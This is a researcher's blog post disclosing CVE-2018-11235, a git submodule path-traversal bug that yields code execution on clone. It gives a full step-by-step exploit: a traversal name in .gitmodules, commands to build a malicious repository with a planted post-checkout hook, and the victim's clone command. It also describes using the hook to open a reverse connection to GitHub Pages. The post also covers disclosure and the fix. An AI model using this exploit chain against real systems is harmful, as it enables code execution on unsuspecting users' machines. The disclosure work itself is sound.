<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]><html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--><html class="no-js" prefix="og: http://ogp.me/ns#" xmlns:og="http://ogp.me/ns#"><!--<![endif]-->

    <head>
                <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" />
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <meta name="author" content="">
  
	
        <meta property="og:site_name" content="Staaldraad">
        <meta property="og:title" content="Staaldraad">
        <meta property="og:url" content="https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/">
        <meta property="og:description" content="">
    
        <meta property="og:type" content="article" />
        <meta property="og:article:author" content="" />
        <meta property="og:article:published_time" content="2018-06-03T08:10:39Z" />
    
        <meta name="generator" content="Hugo 0.31-DEV" />
        <title>CVE-2018-11235 git RCE &middot; Staaldraad</title>
        <link rel="canonical" href="https://staaldraad.github.io/" />
        <link rel="alternate" type="application/rss+xml" title="RSS" href="">
        <link rel="stylesheet" type="text/css" href="https://staaldraad.github.io/css/main.css"/>
        <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:300|Montserrat:700" rel="stylesheet" type="text/css">
        <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
        <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
    </head>

<body>
<!--[if lt IE 7]><p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chrome/â€Ž">install Google Chrome</a> to experience this site.</p><![endif]-->

    <header id="site-header">
        <div class="container">
            <a href="https://staaldraad.github.io/" alt="Staaldraad"><h1 class="blog-title heading">Staaldraad</h1></a>
            
            <p class="blog-description"></p>
           
            <a href="https://twitter.com/_staaldraad"><span class="icon icon--twitter"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"></path></svg>
            </span><span class="username">_staaldraad</span></a>
            <br/>
            <a href="https://github.com/staaldraad"><span class="icon icon--github"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"></path></svg>
            </span><span class="username">staaldraad</span></a>
        </div>
    </header>
<main class="content" role="main">
	<div class="container">
		<article class="post">
	<header class="post-header">
        <h3 class="p-post-title">CVE-2018-11235 git RCE</h3>
        <p class="post-time"><time datetime="2018-06-03T08:10:39Z">June 3, 2018</time></p>
    </header>

    <section class="post-content">
        

<p>Recently I was working on a git repository that contained numerous submodules. At this point I realised that I did not know how submodules worked and decided to dive into the submodule system to gain a better understanding. During this process of discovery I came across a vulnerability in the submodule system, which lead to Remote Code Execution (RCE) in git when a submodule was initialised. This allowed for reliable exploitation of the host that was cloning my <em>malicious</em> repository, and ultimately gave me RCE in <a href="https://bounty.github.com/bounty-hunters.html">GitHub Pages</a> and <a href="http://lkml.iu.edu/hypermail/linux/kernel/1805.3/05909.html">CVE-2018-11235 for git</a>.</p>

<p>What follows are the steps that led to the discovery of the vulnerability and how to exploit it. This is probably one of my favourite bugs that I&rsquo;ve found. Simple on the face of it, but I had to work, and needed some luck, to achieve code execution.</p>

<h2 id="submodule-basics">Submodule Basics</h2>

<p>Git allows you to include external repositories into your repository, allowing you to easily include external dependencies and automatically track changes to these. From <a href="https://git-scm.com/docs/gitsubmodules">git-scm</a></p>

<blockquote>
<p>A submodule is a repository embedded inside another repository. The submodule has its own history; the repository it is embedded in is called a superproject.</p>
</blockquote>

<p>If you want the full low-down on submodules, these resources could be useful:</p>

<ul>
<li><a href="https://git-scm.com/book/en/v2/Git-Tools-Submodules">https://git-scm.com/book/en/v2/Git-Tools-Submodules</a></li>
<li><a href="https://blog.github.com/2016-02-01-working-with-submodules/">https://blog.github.com/2016-02-01-working-with-submodules/</a></li>
<li><a href="https://chrisjean.com/git-submodules-adding-using-removing-and-updating/">https://chrisjean.com/git-submodules-adding-using-removing-and-updating/</a></li>
</ul>

<p>To understand how submodules work, let&rsquo;s add a basic submodule and see what changes are made to our repository.
To add a submodule to your repository you simply use the <code>git submodule add</code> command. This takes care of cloning the external repository and setting up a few configuration options for you. Each submodule has a <strong>name</strong> and a <strong>path</strong>. The <strong>path</strong> is used to track the submodule and this is also where in your repository the submodule will be stored.</p>

<p>If we add an external submodule with</p>

<pre><code class="language-bash">git submodule add https://github.com/staaldraad/repository.git mysubmodule
</code></pre>

<p>the following files will be created:</p>

<ul>
<li><code>mysubmodule/</code> - this is the path relative to your repository into which the submodule will be cloned</li>
<li><code>.gitmodules</code> - this file will be created if it doesn&rsquo;t exist, and will contain the basic <code>init</code> information about your submodule[s]</li>
<li><code>$GIT_DIR/modules/mysubmodule</code> - this folder contains the git directory for the submodule (this is the same as the .git directory you already know)</li>
<li><code>$GIT_DIR/config</code> - the .git/config file gets modified to contain a reference to all our submodules</li>
</ul>

<p>Once the submodule has been added to the repository and you push the changes to your remote, you might notice that the contents of the submodule aren&rsquo;t actually added to the remote. The <strong>.gitmodules</strong> file contains the information about our submodule[s] and will be used to initialise the submodules in any clones of our repository.</p>

<p><img src="/assets/git-submodule-repo.png" alt="Submodule in a repo" /></p>

<p>To have the submodule[s] get initialised in your local clone of the repository, you would either need to specify this during the <code>clone</code> with:</p>

<pre><code class="language-bash">git clone --recurse-submodules https://github.com/staaldraad/repository.git
</code></pre>

<p>Or you can do it in an existing repository with:</p>

<pre><code class="language-bash">git submodule update --init
</code></pre>

<p>The <strong>.gitmodules</strong> file plays an important role in submodules, and is something under our control. Inspecting the <strong>.gitmodules</strong> file you&rsquo;ll see the following:</p>

<pre><code>[submodule &quot;mysubmodule&quot;]
        path = mysubmodule
        url = https://github.com/staaldraad/repository.git
</code></pre>

<p>And this is where I noticed something that triggered the &ldquo;spidey senses&rdquo; and the search for a vulnerability started.</p>

<h2 id="vulnerability-discovery">Vulnerability Discovery</h2>

<p>Looking at the <strong>.gitmodules</strong> file you might notice that <em>mysubmodule</em> occurs twice, once in the submodule <em>name</em> and once in our <em>path</em>. By default the submodule name is the same as the submodule path, unless a name is specified with the <code>--name</code> argument. What you might also notice, is that submodule name is used to create the <em>.git</em> directory for the submodule. The path for this directory ended up being<code>$GIT_DIR/modules/mysubmodule</code>. This got me wondering, what if the submodule name is a path? To see if I could manipulate the file path used, I modified the submodule name in the <code>.gitmodules</code> file.</p>

<p>The modified <strong>.gitmodules</strong>:</p>

<pre><code>[submodule &quot;../../submodule&quot;]
        path = mysubmodule
        url = https://github.com/staaldraad/repository.git
</code></pre>

<p>I committed the changes and went through the process of cloning the directory. The changes to the submodule name resulted in the submodule repository being created in the main repository instead of in <code>.git/modules</code> where it belongs.</p>

<pre><code class="language-bash">git clone --recurse-submodules https://github.com/staaldraad/repository.git
&lt;snip&gt;...&lt;/snip&gt;

cd repository

ls -l 
drwxrwxr-x. 2 staaldraad staaldraad    40 May  3 13:26 submodule
-rw-rw-r--. 1 staaldraad staaldraad     3 May  3 13:26 README.md
drwxrwxr-x. 2 staaldraad staaldraad    40 May  3 13:26 mysubmodule

ls -l submodule                                                                                                             
total 28
drwxrwxr-x. 2 staaldraad staaldraad    40 May  3 13:26 branches
-rw-rw-r--. 1 staaldraad staaldraad   293 May  3 13:26 config
-rw-rw-r--. 1 staaldraad staaldraad    73 May  3 13:26 description
-rw-rw-r--. 1 staaldraad staaldraad    41 May  3 13:26 HEAD
drwxrwxr-x. 2 staaldraad staaldraad   240 May  3 13:26 hooks
-rw-rw-r--. 1 staaldraad staaldraad 11120 May  3 13:26 index
drwxrwxr-x. 2 staaldraad staaldraad    60 May  3 13:26 info
drwxrwxr-x. 3 staaldraad staaldraad    80 May  3 13:26 logs
drwxrwxr-x. 4 staaldraad staaldraad    80 May  3 13:26 objects
-rw-rw-r--. 1 staaldraad staaldraad   107 May  3 13:26 packed-refs
drwxrwxr-x. 5 staaldraad staaldraad   100 May  3 13:26 refs

</code></pre>

<p>Turns out there is directory traversal in the submodule cloning function and we can now write to an arbitrary location, but unfortunately we don&rsquo;t control the data. Everything that is created comes from git, and besides, what use is a git repository when we want to get code execution? At this point I went down a small rabbit hole of trying to write to different locations using <em>symlinks</em>, and all this got me however was the ability to <em>overwrite</em> existing folders (annoying and destructive, but not really all that useful).</p>

<p>Taking a step back and deciding to worry less about fully controlling the contents to be written and having a look at git itself and how you could execute code from git, I was reminded of <a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks">git hooks</a>.</p>

<h3 id="git-hooks">git hooks</h3>

<p>Git hooks are divided into your client-side and server-side hooks. These hooks are simply executable scripts (bash, etc) that are triggered when predefined events happen in the git workflow. A common example of this is a <code>pre-commit</code> hook that verifies no sensitive data is being included in the commit. These hooks seem like a promising avenue for code-execution, but unfortunately hooks are located in <code>$GIT_DIR/hooks/</code>, meaning they are <em>never</em> include in your git repository stored on a remote, and aren&rsquo;t part of what gets cloned when you do a <code>git clone</code>. This is for good reason, if hooks were in the actual git work-tree, I could easily create a repository with a malicious client-side hook and anyone cloning that repository would end up executing the hook. Not ideal.</p>

<p>Submodules can also have hooks, since the submodule is simply an external git repository, and these are stored in <code>$GIT_DIR/modules/modulename/hooks</code>. This gave me an idea, what if we use our submodule directory traversal to create/trigger a hook outside of the <code>$GIT_DIR</code>?</p>

<h3 id="back-to-traversal">Back to traversal</h3>

<p>Since the traversal allows our submodule repository to be outside of the <code>$GIT_DIR</code> we can add it to our work-tree and commit this to our remote. This means it would be included in any <code>git clone</code> and in theory the hook should trigger when any changes are made to the submodule.</p>

<p>At this point I did the following:</p>

<p>Add a submodule:</p>

<pre><code class="language-bash">git submodule add https://github.com/staaldraad/repository.git submod
</code></pre>

<p>Create a &ldquo;fakegit&rdquo; directory to use for our traversal:</p>

<pre><code class="language-bash">mkdir -p fakegit/modules
</code></pre>

<p>Move the folder out of <code>$GIT_DIR/modules</code> and into the main repository (for traversal):</p>

<pre><code class="language-bash">mv .git/modules/submod fakegit/modules
</code></pre>

<p>Create a git hook</p>

<pre><code class="language-bash">vim fakegit/modules/submod/hooks/post-checkout
chmod +x !$
</code></pre>

<p>Modify <strong>.gitmodules</strong> to contain the traversal (new module name: <code>../../fakegit/modules/submod</code>)</p>

<p>Push everything to the remote:</p>

<pre><code class="language-bash">git add .
git commit -m &quot;msg&quot;
git push origin master
</code></pre>

<p>The idea being that when the repository gets cloned, <code>fakegit/modules/submod</code> would appear to be a valid submodule repository, and when the subsequent <code>git submodule update --init</code> is run, git would use <code>fakegit/modules/submod</code> instead of <code>$GIT_DIR/modules/submod</code> due to our traversal. Since this contains a hook, the hook should be executed once the <code>checkout</code> completes.</p>

<p>Great in theory, but in practice it fails.</p>

<pre><code class="language-bash">Submodule '../../fakegit/modules/submod' (https://github.com/staaldraad/repository.git) registered for path 'submod'
Cloning into '/tmp/c/v/subs/submod'...
fatal: /tmp/c/v/subs/.git/modules/../../fakegit/modules/submod already exists
fatal: clone of 'https://github.com/staaldraad/repository.git' into submodule path '/tmp/c/v/subs/submod' failed
Failed to clone 'submod'. Retry scheduled
Cloning into '/tmp/c/v/subs/submod'...
remote: Counting objects: 274, done.        
remote: Compressing objects: 100% (227/227), done.        
remote: Total 274 (delta 14), reused 268 (delta 8), pack-reused 0        
Receiving objects: 100% (274/274), 44.03 KiB | 392.00 KiB/s, done.
Resolving deltas: 100% (14/14), done.
Submodule path 'submod': checked out 'cc0db68d85f7ce60a51c62bf451d7575e5a9a89e'
Submodule path 'submod': checked out 'cc0db68d85f7ce60a51c62bf451d7575e5a9a89e'

</code></pre>

<p>Recall I mentioned earlier that this traversal allowed me to overwrite arbitrary folders? That is exactly what happens here. The submodule tries to initialise the submodule repository in our fake location, but the folder already exists. It ends up deleting the contents, and then retrying. This overwrites our specially crafted attack and the hook never fires.</p>

<pre><code class="language-bash">fatal: /tmp/c/v/subs/.git/modules/../../fakegit/modules/submod already exists
fatal: clone of 'https://github.com/staaldraad/repository.git' into submodule path '/tmp/c/v/subs/submod' failed
Failed to clone 'submod'. Retry scheduled
Cloning into '/tmp/c/v/subs/submod'...
</code></pre>

<p>Not willing to give up and the spidey senses shouting more than ever that RCE is within reach, I started playing a frustrating game of <em>&ldquo;prevent git from overwriting the hooks&rdquo;</em>. Initially I thought I would try and win a race, use one submodule to write the contents of the <strong>hooks</strong> folder before git tries to retry the failed clone. Unfortunately I kept failing, as the overwrite happened on the second retry, so even if I was successful with writing to the folder using a second submodule, it would all get overwritten.</p>

<h3 id="getting-lucky">Getting lucky</h3>

<p>And this is when I got lucky. While trying to win the race, I had always (without realising it) picked a &ldquo;<strong>path</strong>&rdquo; for the second submodule that was alphabetically after the first submodule. This meant the first module would always try to be created, fail, the second module would get added and then the first would be cloned again. While trying different attacks, I inadvertently changed the second module&rsquo;s path to be alphabetically before the first, so the second path was <strong>mod1</strong> while the first was <strong>submod</strong>.</p>

<p>A small change, but it triggered a new code path, which I&rsquo;m not even going to pretend I knew would happen. When one or more submodules exist in <code>$GIT_DIR/modules</code>, then no files get overwritten by our traversing submodule. By initialising the <em>&ldquo;second&rdquo;</em> submodule, it created the folder <code>$GIT_DIR/modules/mod1</code> and suddenly <code>fakegit/modules/submod</code> was accepted as valid path and no overwrite occurred. This meant the hook was still present and could now be triggered!</p>

<h2 id="exploitation">Exploitation</h2>

<p>With everything learned, it was time to put together an attack chain. Exploitation requires you to create the <em>&ldquo;malicious&rdquo;</em> repository, which will be cloned by our victim.</p>

<p>Firstly create the repo:</p>

<pre><code class="language-bash">mkdir badrepo
cd badrepo
git init
git remote add origin https://github.com/staaldraad/demosub.git
</code></pre>

<p>Create needed folders where our directory traversal will look for the submodule:</p>

<pre><code class="language-bash">mkdir -p fakegit/modules
</code></pre>

<p>Add two submodules as follows &ndash; the contents of these don&rsquo;t matter, they just need to be public/cloneable</p>

<pre><code class="language-bash">git submodule add https://github.com/staaldraad/repository.git submod
git submodule add https://github.com/staaldraad/repository.git aaa
</code></pre>

<p>Move the git repository for our fake submodule from <code>.git/modules/submod</code></p>

<pre><code class="language-bash">mv .git/modules/submod fakegit/modules/submod
</code></pre>

<p>Create our hook in the fake git, this should be a valid bash script</p>

<pre><code class="language-bash">cat &gt; fakegit/modules/submod/hooks/post-checkout &lt;&lt;EOF
#!/bin/sh

echo &quot;PWNED&quot;
ping -c 3 127.0.0.1

exit 0
EOF

chmod +x fakegit/modules/submod/hooks/post-checkout

</code></pre>

<p>Now add our path traversal to <strong>.gitmodules</strong> by changing <code>&quot;submod&quot;</code> to <code>&quot;../../fakegit/modules/submod&quot;</code> (a text editor works fine as well&hellip;):</p>

<pre><code class="language-bash">sed -i '0,/submod/{s/&quot;submod/&quot;\.\.\/\.\.\/fakegit\/modules\/submod/}' .gitmodules
</code></pre>

<p>We also need to update the <code>gitdir</code> path in the submodule&rsquo;s .git file to point to our new location. Git uses this during the construction of the working tree and would fail to create our commit if we don&rsquo;t make this change (since we deleted <code>$GIT_DIR/modules/submod</code> when we moved it to the new fakegit location. Change <code>gitdir: ../.git/modules/submod</code> to <code>gitdir: ../fakegit/modules/submod</code></p>

<pre><code class="language-bash">sed -i 's/\.git/fakegit/' submod/.git
</code></pre>

<p>Add, commit and push</p>

<pre><code class="language-bash">git add .
git commit -m &quot;woot&quot;
git push origin master
</code></pre>

<h3 id="victim-side">Victim side</h3>

<p>When the repository is cloned and <code>--recurse-submodules</code> is used we will now get RCE:</p>

<pre><code class="language-bash">git clone --recurse-submodules https://github.com/staaldraad/demosub.git
</code></pre>

<p><img src="/assets/git-rce.png" alt="RCE during clone" /></p>

<p>The same would happen in the case of <code>git submodule update --init</code></p>

<pre><code class="language-bash">git clone https://github.com/staaldraad/demosub.git
cd demosub
git submodule update --init
</code></pre>

<h2 id="github-pages-rce">GitHub Pages RCE</h2>

<p>Having a fresh RCE in git is great, but it requires the repository to be cloned in a specific way and might not be seen as <em>&ldquo;real world&rdquo;</em>. Thus I went looking for a good way to demonstrate risk. Having had GitHub on my list of &ldquo;<em>would love to get a shell on &lsquo;x&rsquo;</em>&rdquo; and having looked into GitHub Pages before (and hosting this blog on GitHub Pages), I knew that GitHub pages allows you to have <a href="https://help.github.com/articles/using-submodules-with-pages">submodules in the repository used</a>.</p>

<p>Testing if this would work was really simple, a small change to the <strong>post-checkout</strong> script so that it didn&rsquo;t ping localhost but rather made a reverse connection to a host under my control. And then enabling GitHub pages on the repository.</p>

<p><img src="/assets/github-rce.png" alt="GitHub Pages RCE" /></p>

<p>Great success! A quick verification that the IP address was indeed from GitHub and I knew I now had RCE on GitHub.</p>

<p>I didn&rsquo;t try to take the exploitation further at this point, and instead focused on getting a report out to GitHub. It was good to note the use of an unprivileged user in a Docker container, limiting the attack surface and opportunities for further compromise, and preventing access to other GitHub users&rsquo; data.</p>

<p>I reported the issue to GitHub and they were brilliant with the response. My report went in on a Sunday afternoon CEST (so really early Sunday morning PST), within three hours of receiving the report the GitHub team had replicated, triaged and put in a temporary fix! The whole disclosure process was an advertisement for how a successful BugBounty program is run. The team over at GitHub assisted in getting the issue reported upstream into git-core and the issuing of a CVE etc.</p>

<h3 id="edge-case">Edge Case</h3>

<p>When I found the vulnerability I was testing against git version 2.13.6. I asked a friend (the legend <a href="https://twitter.com/saif_sherei">@Saif_Sherei</a>) to test it out on his box and the exploit failed! He had git version 2.7.4 installed, which still triggered the exploit, but during the clone the <code>worktree</code> directory was changed to include additional <code>..\..\</code> which prevented the exploit from completing. After the vulnerability was disclosed, <a href="https://twitter.com/_atorralba">Tony Torralba @_atorralba</a> replicated the vulnerability on git 2.7.4 by crafting an elegant work around. I highly recommend you head over to <a href="https://atorralba.github.io/CVE-2018-11235/">his write-up</a>, where he explains his thinking and the symlink trick to get this to work.</p>

<h3 id="other-operating-systems">Other Operating Systems</h3>

<p>It should be noted that this issue isn&rsquo;t only exploitable through git for Linux, as demonstrated above, but should also be exploitable on OSX and Windows. The Microsoft Visual Studio Team Services team included a working PoC for OSX in their patch announcement.</p>

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Announcing a security vulnerability in Git; please update your Git clients, and see our blog post about how to mitigate this issue.  <a href="https://t.co/QXWogWnWRW">https://t.co/QXWogWnWRW</a> <a href="https://t.co/dEdnWj1cAM">pic.twitter.com/dEdnWj1cAM</a></p>&mdash; Visual Studio Team Services (@VSTS) <a href="https://twitter.com/VSTS/status/1001544001881862145?ref_src=twsrc%5Etfw">May 29, 2018</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


<h2 id="fix">Fix</h2>

<p>A patch for git was released on the 29th of June 2018. The great things is that the patch doesn&rsquo;t only resolve the client-side issue, but also introduces an option to prevent git servers from passing along &ldquo;evil&rdquo; gitmodule objects. This isn&rsquo;t enabled by default but can be toggled by switching on <code>transfer.fsckObjects</code>. More information is <a href="https://public-inbox.org/git/20180529211950.26896-1-avarab@gmail.com/">available in the here</a>.</p>

<p>The above fix has been enabled on most major hosters; GitHub, Gitlab, Microsoft Visual Studio Team Services. This is highly commendable and prevents abuse of these hosting services and using these for launching attacks. It is great to see the different organisations working together in the remediation of this issue and protecting end-users.</p>

<p>The following versions have the security update applied, it is recommended that you update to a non-vulnerable version;</p>

<ul>
<li>v2.17.1 (latest)</li>
<li>v2.16.4</li>
<li>v2.15.2</li>
<li>v2.14.4</li>
<li>v2.13.7</li>
</ul>

<p>Thanks to the Github security team for facilitating the reporting and disclosure of this issue. Thanks to the maintainers of git for the quick response and fix.</p>

<p><a href="https://twitter.com/ethomson">Edward Thomson</a> has also written a great post with useful information on how to update git on various platforms and how to verify whether you are vulnerable. Definitely recommend you read <a href="https://www.edwardthomson.com/blog/upgrading_git_for_cve2018_11235.html">his post</a>.</p>

<p>The git team also created a test script for the issue, which is does the exploit setup using built-in git commands and skips some unnecessary steps I went through: <a href="https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44#diff-07b96ecc79256b188e0ea9b2c6d1180e">git test script</a></p>

<h3 id="further-reading-references">Further Reading / References</h3>

<ul>
<li><a href="https://marc.info/?l=git&amp;m=152761328506724&amp;w=2">Git update release notes</a></li>
<li><a href="https://blogs.msdn.microsoft.com/devops/2018/05/29/announcing-the-may-2018-git-security-vulnerability/">Microsoft Visual Studio Team Services update announcement</a></li>
<li><a href="https://www.edwardthomson.com/blog/upgrading_git_for_cve2018_11235.html">Edward Thomson - upgrading git and testing if you are vulnerable</a></li>
<li><a href="https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44">Commit to git fixing the issue</a></li>
<li><a href="https://atorralba.github.io/CVE-2018-11235/">Tony Torralba&rsquo;s Blog post with PoC exploit</a></li>
<li><a href="https://www.allthingsgit.com/episodes/git_security_with_etienne_stalmans.html">All things git podcast with Edward and Martin discussing this and other git security issues</a></li>
</ul>

    </section>

    <hr>

    <footer class="post-footer">
        <section class="f-1">
            
            
            <p class="f-post-time"><time datetime="2018-06-03T08:10:39Z">June 3, 2018</time></p>
        </section>
                        
        <section class="f-2">
            <section class="share">
                <span>Share:
                <a class="icon-twitter" href="http://twitter.com/share?text=CVE-2018-11235%20git%20RCE&url=https%3a%2f%2fstaaldraad.github.io%2fpost%2f2018-06-03-cve-2018-11235-git-rce%2f"
                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                    <i class="fa fa-twitter"></i>
                </a>
                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fstaaldraad.github.io%2fpost%2f2018-06-03-cve-2018-11235-git-rce%2f"
                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
                    <i class="fa fa-facebook"></i>
                </a>
                <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2fstaaldraad.github.io%2fpost%2f2018-06-03-cve-2018-11235-git-rce%2f"
                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
                    <i class="fa fa-google-plus"></i>
                </a>
                </span>
            </section>

            
        </section>
                        
    </footer>
</article>
	</div>
</main>
    <footer id="site-footer">
        <div class="container">
          
          
          
          
          <a href="https://staaldraad.github.io/index.xml" title="Get the RSS feed"><span class="tooltip"><i class="fa fa-rss"></i></span></a>
          <section>&copy; <a href="https://staaldraad.github.io/"></a> 2018 | All rights reserved</section>
          <section>Theme by <a href="http://www.jrdnbwmn.com">Jordan Bowman</a>. Generated with <a href="http://gohugo.io/">Hugo</a>.</section>
        </div>
    </footer>

    <script type="text/javascript" src="https://staaldraad.github.io/js/fittext.js"></script>
    <script type="text/javascript">
      $(".heading").fitText();
    </script>



</body>
</html>